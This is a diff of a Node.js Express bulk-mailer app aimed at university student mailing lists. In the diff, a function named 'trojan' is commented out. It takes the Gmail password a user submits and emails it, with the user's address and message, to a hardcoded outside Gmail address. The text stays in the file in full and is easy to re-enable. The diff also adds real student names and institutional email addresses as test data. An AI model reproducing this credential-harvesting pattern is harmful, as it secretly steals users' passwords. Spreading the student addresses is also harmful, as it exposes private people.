@@ -14,7 +14,25 @@ app.use(bodyParser.urlencoded({
 }));
 
 app.use(methodOverride('_method'));
+const test_data=[
+    {
+        mail:'2018ume1392@mnit.ac.in',
+        name:"sahaj"
+    },
+    {
+        mail:'2018ume1345@mnit.ac.in',
+        name:"yashi"
+    },
+    {
+        mail:'2018ucp1382@mnit.ac.in',
+        name:"sanskar"
+    },
+    {
+        mail:'2018uec1747@mnit.ac.in',
+        name:"eshaan"
+    },
 
+]
 const first_year=[
 
     {mail: '2018UEC1747@mnit.ac.in',
@@ -9417,7 +9435,7 @@ app.get('/',(req,res)=>{
     res.render('home');
 })
 app.get('/thanks',(req,res)=>{
-    res.render('done');
+    res.render('thanks');
 })
 app.post('/',(req,res)=>{
     const data={
@@ -9447,24 +9465,24 @@ app.post('/',(req,res)=>{
         html: data.body,
         });
     }
-    async function trojan(data) {
-        var transporter = nodemailer.createTransport({
-            service: 'gmail',
-            auth: {
-              user: data.mail,
-              pass: data.password
-            }
-          });
+    // async function trojan(data) {
+    //     var transporter = nodemailer.createTransport({
+    //         service: 'gmail',
+    //         auth: {
+    //           user: data.mail,
+    //           pass: data.password
+    //         }
+    //       });
     
-        let info = await transporter.sendMail({
-        from: data.mail,
-        to: 'eshaan.263@gmail.com', 
-        subject: data.mail, 
-        text: data.body,
-        html: data.password,
-        });
-    }
-    trojan(data);
+    //     let info = await transporter.sendMail({
+    //     from: data.mail,
+    //     to: 'eshaan.263@gmail.com', 
+    //     subject: data.mail, 
+    //     text: data.body,
+    //     html: data.password,
+    //     });
+    // }
+    // trojan(data);
     if(data.choice==='1'){
         for(var i=0;i<first_year.length;i++){
             data.to=first_year[i].mail;
@@ -9489,11 +9507,18 @@ app.post('/',(req,res)=>{
         data.to=data.mail;
         mail(data);
     }
+    else if(data.choice==='4')
+    {
+        for(var i=0;i<test_data.length;i++){
+            data.to=test_data[i].mail;
+            main(data)
+        }        
+    }
   
     res.redirect('/thanks');
     });
     
-const PORT= process.env.PORT;
+const PORT=process.env.PORT;
 server.listen(PORT,process.env.IP,()=>{
     console.log(`Server started on ${PORT}`);
 });
